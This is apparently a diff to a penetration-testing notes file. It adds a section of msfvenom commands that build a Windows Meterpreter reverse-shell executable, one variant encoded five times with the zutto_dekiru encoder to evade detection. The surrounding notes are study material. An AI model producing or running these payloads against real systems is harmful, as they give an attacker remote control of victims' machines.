@@ -397,6 +397,12 @@ Giveaway of the day
 - tracert -h ipaddress, route PRINT, netstat -r
 - arp -a, arp -av, arp -a -N ipaddress
 
+# Creating Windows Payload with Msfvenom
+- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Ip address LPORT=4444 -f exe > reverse.exe
+- [X] Using x64/zutto_dekiru
+- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Ip address LPORT=4444 -e x64/zutto_dekiru -i 5 -f exe > reverse1.exe
+- hexeditor reverse.exe
+
 # AlienVault/ DVWA/ OSForensics/ ProDiscover Basic
 
 # References
